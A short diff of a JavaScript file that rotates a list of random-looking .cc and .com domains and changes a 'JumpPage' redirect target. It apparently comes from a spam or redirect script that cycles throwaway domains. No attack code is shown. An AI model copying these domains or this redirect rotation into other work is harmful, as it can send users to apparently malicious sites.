@@ -37,12 +37,12 @@ var emails = [
 ];
 
 var urls=[
+	'mzudozli.cc/', 
 	'xvmalvc.cc/', 
-	'mlszcluq.cc/', 
-    'kqxuvrzmm.com/',
+    'mlszcluq.cc/',
 ];                                                                                                                  
 
-var JumpPage="https://navdzit.cc";
+var JumpPage="https://rpnrbxgch.cc";
 
 var newestUrls = [];
 
